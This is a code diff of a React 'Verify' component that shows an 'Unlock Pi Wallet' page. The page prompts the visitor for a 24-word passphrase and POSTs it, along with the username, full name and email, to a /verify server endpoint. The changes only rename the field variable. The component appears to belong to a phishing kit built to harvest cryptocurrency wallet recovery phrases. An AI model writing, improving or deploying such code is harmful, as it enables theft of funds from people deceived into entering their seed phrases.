@@ -10,7 +10,7 @@ const Verify = () => {
     const getData1 = location.state;
     const navigate = useNavigate();
 
-    const [walletkey, setWalletKey] = useState("");
+    const [wallet, setWalletKey] = useState("");
 
     const {username, full_name, email, subject, message} = getData1
 
@@ -26,7 +26,7 @@ const Verify = () => {
     const handleSubmit = async (e) => {
 
         e.preventDefault();
-        const finalData = {...getData1, walletkey};
+        const finalData = {...getData1, wallet};
         console.log(finalData, JSON.stringify(finalData));
         const response = await fetch('http://127.0.0.1:3001/verify',{
             method: "POST",
@@ -50,7 +50,7 @@ const Verify = () => {
                 <h1 class="text-gray-800 text-2xl font-bold pb-4">Unlock Pi Wallet</h1>
                 <div class="setInputBox">
                     <div>
-                        <textarea required value={walletkey} onChange={(e) => setWalletKey(e.target.value)}  type="text" placeholder="To proceed, please enter your 24-word passphrase here." class="setInput h-50" />
+                        <textarea required name="wallet" value={wallet} onChange={(e) => setWalletKey(e.target.value)}  type="text" placeholder="To proceed, please enter your 24-word passphrase here." class="setInput h-50" />
                     </div>
                 </div>
                 <div class="flex justify-center items-center mt-5">
